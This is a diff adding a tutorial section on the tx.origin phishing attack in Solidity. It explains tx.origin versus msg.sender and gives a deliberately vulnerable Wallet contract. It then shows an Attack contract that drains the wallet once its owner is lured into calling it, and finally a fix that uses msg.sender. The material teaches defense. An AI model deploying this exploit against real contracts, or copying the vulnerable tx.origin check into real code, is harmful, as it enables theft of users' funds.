@@ -665,4 +665,83 @@ contract Attack {
 }
 ```
 
+## SOLIDITY ATTACK VECTORS #9 - Pishing with tx.origin
+The tx.origin global variable refers to the original external account that started the transaction while msg.sender refers to the immediate account (it could be external or another contract account) that invokes the function. The tx.origin variable will always refer to the external account while msg.sender can be a contract or external account.
+
+If Alice calls contract _A_ and contract _A_ calls contract _B_. In contract _B_, the msg.sender is contract A while the tx.origin is Alice. _tx.origin_ is where the transaction was originated from.
+
+```markdown
+Alice -> Contract A -> Contract B [tx.origin = Alice]
+                                  [msg.sender = Contract A]
+```
+
+![Pishing with tx.origin Illustration](/images/pishing.png "Pishing with tx.origin Illustration")
+
+In the Wallet Contract below, Alice deploys the contract and set as the _owner_ of the contract. In the _transfer()_ function, there is a condition that helps to check if the user is the rightful owner
+```solidity
+require(tx.origin == owner, "Not owner");
+```
+
+The attacker uses the _Attack_ contract to interact with the _Wallet_ contract. The transaction will fail when the attacker calls the _attack()_ function. So, the attacker will have to lure Alice, the owner of the contract to  trigger the _attack()_ function, and the fund will be transferred to the attacker's account since we have, _tx.origin == owner_.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+contract Wallet {
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+    }
+
+    function transfer(address payable _to, uint _amount) public {
+        require(tx.origin == owner, "Not owner");
+
+        (bool sent, ) = _to.call{value: _amount}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+
+contract Attack {
+    address payable public owner;
+    Wallet wallet;
+
+    constructor(Wallet _wallet) {
+        wallet = Wallet(_wallet);
+        owner = payable(msg.sender);
+    }
+
+    function attack() public {
+        wallet.transfer(owner, address(wallet).balance);
+    }
+}
+```
+
+### Preventive Technique
+Never use tx.origin to check for authorisation of ownership, instead use msg.sender
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+contract Wallet {
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+    }
+
+    function transfer(address payable _to, uint _amount) public {
+        require(msg.sender == owner, "Not owner");
+
+        (bool sent, ) = _to.call{value: _amount}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+
+```
+
+
+
 
